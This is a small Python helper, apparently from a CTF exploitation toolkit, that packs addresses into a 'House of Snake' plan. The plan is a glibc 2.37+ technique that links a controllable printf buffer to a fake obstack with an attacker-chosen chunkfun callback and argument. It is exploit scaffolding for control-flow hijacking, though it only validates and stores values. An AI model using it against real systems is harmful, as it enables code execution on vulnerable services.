"""House of Snake printf_buffer to obstack linkage plan."""
from dataclasses import dataclass

@dataclass(frozen=True)
class SnakePlan:
    printf_buffer_addr: int
    obstack_addr: int
    object_base: int
    next_free: int
    chunk_limit: int
    chunkfun: int
    extra_arg: int

def build_house_of_snake(*, printf_buffer_addr: int, obstack_addr: int,
                         object_base: int, next_free: int,
                         chunkfun_addr: int, extra_arg: int,
                         chunk_limit: int | None = None) -> SnakePlan:
    """生成 2.37+ `__printf_buffer_obstack` 持有的 obstack 计划。

    printf_buffer_addr: 题目可控 printf buffer 对象地址；obstack_addr: 其中引用的 fake obstack。
    其余参数对应 obstack 的当前 chunk、扩容 callback 和 callback 参数。
    该函数不假设内部 printf buffer 的 obstack 指针偏移，需由 Build ID/调试信息确认后写入。
    """
    if chunk_limit is None:
        chunk_limit = next_free
    vals = (printf_buffer_addr, obstack_addr, object_base, next_free, chunk_limit, chunkfun_addr, extra_arg)
    if any(not isinstance(v, int) or v < 0 or v >= 1 << 64 for v in vals):
        raise ValueError("value must fit uint64")
    return SnakePlan(*vals)
